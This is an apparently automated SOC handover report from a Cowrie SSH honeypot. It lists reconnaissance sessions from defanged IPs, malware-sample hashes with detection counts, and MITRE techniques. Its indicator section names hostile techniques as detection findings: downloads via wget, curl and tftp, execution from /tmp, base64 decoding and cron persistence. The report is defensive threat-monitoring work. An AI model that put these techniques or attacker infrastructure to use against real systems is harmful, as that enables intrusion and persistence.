| `2026-07-26 22:54:43` | `cowrie.command.input` |
| `2026-07-26 22:54:44` | `cowrie.log.closed` |
| `2026-07-26 22:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6090cef192c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:42` | `cowrie.session.connect` |
| `2026-07-26 22:54:42` | `cowrie.client.version` |
| `2026-07-26 22:54:43` | `cowrie.client.kex` |
| `2026-07-26 22:54:44` | `cowrie.login.success` |
| `2026-07-26 22:54:44` | `cowrie.session.params` |
| `2026-07-26 22:54:44` | `cowrie.command.input` |
| `2026-07-26 22:54:45` | `cowrie.log.closed` |
| `2026-07-26 22:54:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9fbe0f5443

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:46` | `cowrie.session.connect` |
| `2026-07-26 22:54:46` | `cowrie.client.version` |
| `2026-07-26 22:54:46` | `cowrie.client.kex` |
| `2026-07-26 22:54:46` | `cowrie.login.success` |
| `2026-07-26 22:54:47` | `cowrie.session.params` |
| `2026-07-26 22:54:47` | `cowrie.command.input` |
| `2026-07-26 22:54:47` | `cowrie.log.closed` |
| `2026-07-26 22:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea1249a47720

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:50` | `cowrie.session.connect` |
| `2026-07-26 22:54:50` | `cowrie.client.version` |
| `2026-07-26 22:54:50` | `cowrie.client.kex` |
| `2026-07-26 22:54:50` | `cowrie.login.success` |
| `2026-07-26 22:54:51` | `cowrie.session.params` |
| `2026-07-26 22:54:51` | `cowrie.command.input` |
| `2026-07-26 22:54:51` | `cowrie.log.closed` |
| `2026-07-26 22:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b17ddd1e97fe

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:53` | `cowrie.session.connect` |
| `2026-07-26 22:54:53` | `cowrie.client.version` |
| `2026-07-26 22:54:54` | `cowrie.client.kex` |
| `2026-07-26 22:54:54` | `cowrie.login.success` |
| `2026-07-26 22:54:55` | `cowrie.session.params` |
| `2026-07-26 22:54:55` | `cowrie.command.input` |
| `2026-07-26 22:54:55` | `cowrie.log.closed` |
| `2026-07-26 22:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d364c9b395

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:55 |
| **Last Seen** | 2026-07-26 22:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:55:01` | `cowrie.session.connect` |
| `2026-07-26 22:55:01` | `cowrie.client.version` |
| `2026-07-26 22:55:01` | `cowrie.client.kex` |
| `2026-07-26 22:55:02` | `cowrie.login.success` |
| `2026-07-26 22:55:04` | `cowrie.session.params` |
| `2026-07-26 22:55:04` | `cowrie.command.input` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **10** | 2026-07-26 20:55 | 2026-07-26 22:50 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-26 20:58 | 2026-07-26 22:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-26 21:39 | 2026-07-26 21:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-26 22:01 | 2026-07-26 22:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | **3** | 2026-07-26 21:36 | 2026-07-26 21:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-26 22:52 | 2026-07-26 22:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.184.105[.]34` | **2** | 2026-07-26 21:35 | 2026-07-26 21:37 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.202.113[.]141` | **2** | 2026-07-26 21:55 | 2026-07-26 21:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `41.168.10[.]139` | **2** | 2026-07-26 21:57 | 2026-07-26 22:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.87[.]204` | **2** | 2026-07-26 22:51 | 2026-07-26 22:54 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.255.33[.]179` | 1 | 2026-07-26 21:30 | 2026-07-26 21:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-07-26 21:51 | 2026-07-26 21:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.58.9[.]58` | 1 | 2026-07-26 21:30 | 2026-07-26 21:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-07-26 22:07 | 2026-07-26 22:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-07-26 22:20 | 2026-07-26 22:22 | 66s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-26 21:57 | 2026-07-26 21:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-26 21:06 | 2026-07-26 21:07 | 37s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-26 22:06 | 2026-07-26 22:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.205.1[.]242` | 1 | 2026-07-26 21:05 | 2026-07-26 21:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-26 21:36 | 2026-07-26 21:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.62.72[.]229` | 1 | 2026-07-26 20:55 | 2026-07-26 20:55 | 5s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]158` | 1 | 2026-07-26 22:33 | 2026-07-26 22:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]30` | 1 | 2026-07-26 22:07 | 2026-07-26 22:07 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `41.168.10[.]139` | ZA | Liquid Telecommunications Operations Limited | **100** ⚠️ | 16 |
| `74.208.177[.]56` | US | IONOS Inc. | **100** ⚠️ | 50 |
| `45.33.12[.]122` | US | Linode | **100** ⚠️ | 50 |
| `66.45.144[.]201` | US | Midcontinent Communications | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `175.198.18[.]3` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `187.115.144[.]103` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `213.230.64[.]246` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 50 |
| `121.159.71[.]249` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `218.58.73[.]238` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 159 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 144 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 214 cases |
| Tool 34  | Credential Extractor        | ✅ 162 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 73 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (10.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 143 priority case(s) shown individually · 23 recon entry/entries in table (10 group(s) consolidating 35 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T23:03:53Z_
